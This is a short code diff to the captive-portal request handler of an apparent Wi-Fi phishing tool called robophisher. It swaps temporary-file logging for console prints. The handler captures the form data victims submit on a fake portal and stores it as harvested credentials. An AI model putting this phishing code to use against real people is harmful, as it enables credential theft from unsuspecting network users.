@@ -100,12 +100,9 @@ class CaptivePortalHandler(tornado.web.RequestHandler):
         file_path = template_directory + render_file
         self.render(file_path, **context)
 
-        log_file_path = "/tmp/robophisher-webserver.tmp"
-        with open(log_file_path, "a+") as log_file:
-            log_file.write("GET request from {0} for {1}\n".format(self.request.remote_ip,
-                                                                   self.request.full_url()))
         # record the GET request in the logging file
         logger.info("GET request from %s for %s", self.request.remote_ip, self.request.full_url())
+        print(u"{} \u25C0 {}".format(self.request.remote_ip, self.request.full_url()))
 
     def post(self):
         """
@@ -130,16 +127,13 @@ class CaptivePortalHandler(tornado.web.RequestHandler):
         # check if this is a valid phishing post request
         if content_type.startswith(constants.VALID_POST_CONTENT_TYPE):
             post_data = tornado.escape.url_unescape(self.request.body)
-            # log the data
-            log_file_path = "/tmp/robophisher-webserver.tmp"
-            with open(log_file_path, "a+") as log_file:
-                log_file.write("POST request from {0} with {1}\n".format(
-                    self.request.remote_ip, post_data))
-                # record the post requests in the logging file
-                logger.info("POST request from %s with %s", self.request.remote_ip, post_data)
+            # record the post requests in the logging file
+            logger.info("POST request from %s with %s", self.request.remote_ip, post_data)
 
             creds.append(post_data)
             terminate = True
+
+            print(u"{} \u25B6 {}".format(self.request.remote_ip, post_data))
 
         requested_file = self.request.path[1:]
         template_directory = template
